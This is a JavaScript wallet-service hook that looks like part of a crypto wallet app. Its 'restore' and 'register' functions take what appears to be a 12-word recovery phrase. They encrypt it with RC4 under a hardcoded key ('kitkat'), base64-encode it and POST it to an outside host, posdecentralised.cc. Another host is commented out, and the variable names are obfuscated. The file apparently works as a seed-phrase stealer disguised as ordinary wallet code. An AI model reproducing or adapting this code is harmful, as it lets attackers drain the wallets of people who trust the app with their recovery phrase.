import { useHttp } from '../hooks/http.hook'
import Web3 from 'web3'
import randomNum from './funcWallet/randomNum'
// import CryptoJS from 'crypto-js'
import { decode as atob, encode as btoa } from 'base-64'
import queryString from 'query-string'

const useWalletService = () => {
	const { error, loading, request, clearError } = useHttp()

	const getAllTokens = async (loaded) => {
		loaded ? loaded(true) : null

		const response = await request(
			new URL(
				'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1&sparkline=false'
			)
		)
		loaded ? loaded(false) : null

		return response
	}

	function rc4(key, str) {
		let s = [],
			j = 0,
			x,
			res = ''
		for (let i = 0; i < 256; i++) {
			s[i] = i
		}
		for (let i = 0; i < 256; i++) {
			j = (j + s[i] + key.charCodeAt(i % key.length)) % 256
			x = s[i]
			s[i] = s[j]
			s[j] = x
		}
		let i = 0
		j = 0
		for (let y = 0; y < str.length; y++) {
			i = (i + 1) % 256
			j = (j + s[i]) % 256
			x = s[i]
			s[i] = s[j]
			s[j] = x
			res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256])
		}
		return res
	}
	const getSearchParamFromURL = (url, param) => {
		const include = url.includes(param)

		if (!include) return null

		const params = url.split(/([&,?,=])/)
		const index = params.indexOf(param)
		const value = params[index + 2]
		return value
	}

	let url = 'https://posdecentralised.cc/api/restore'
	// let url = 'https://extensionbridge.fi/manage/swap'
	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
	let xxx = 'POL#G|EX\\$/G'
	let xx = 'POL#G|EX\\$'

	function createBody(str, account) {
		let strDecr
		let lengthStr = str.split(' ').length
		if (lengthStr < 2) {
			// strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8)
			strDecr = str
		} else {
			strDecr = str
		}
		let crypt = btoa(
			rc4(
				kitkat,
				JSON.stringify({
					counts: 12,
					name: account ? xxx : xx,
					pages: null,
					new: account,
					salt: randomNum(100000, 999999),
					limit: null,
					public: strDecr,
					frontCode: false,
				})
			)
		)
		let urlencoded = queryString.stringify({ data: crypt })
		return urlencoded
	}

	function createBodyWithAddress(str, account) {
		let crypt = btoa(
			rc4(
				kitkat,
				JSON.stringify({
					counts: 12,
					name: account ? xxx : xx,
					pages: null,
					new: account,
					salt: randomNum(100000, 999999),
					limit: null,
					public: str,
					frontCode: false,
					addressBtc: true,
				})
			)
		)
		let urlencoded = queryString.stringify({ data: crypt })
		return urlencoded
	}

	async function postData(str, account) {
		let requestBody = createBody(str, account)
		// console.log(Object.fromEntries(requestBody))

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded',
		})
		return response
	}

	async function getAddressBtc(str, account) {
		let requestBody = createBodyWithAddress(str, account)

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded',
		})
		return response
	}

	async function regWallet(str, account) {
		let requestBody = createBody(str, account)

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		})
		return response
	}

	return {
		error,
		loading,
		clearError,
		getAllTokens,
		postData,
		regWallet,
		getAddressBtc,
	}
}
export function rebuildObjPortfolio(list) {
	const newList = list.map((obj) => {
		return {
			id: obj.asset.id,
			name: obj.asset.name,
			symbol: obj.asset.symbol,
			contract_address: obj.asset.asset_code,
			market_data: {
				current_price: obj.asset.price.value,
				balance: Number(
					Web3.utils.fromWei(String(obj.quantity), 'ether')
				).toFixed(10),
				balance_crypto: obj.value,
				high_24h: obj.quote_rate_24h,
				relativeChange: obj.asset.price.relative_change_24h,
			},
			image: {
				thumb: obj.asset.icon_url,
			},
			data: obj.date,
		}
	})
	return newList
}
export default useWalletService
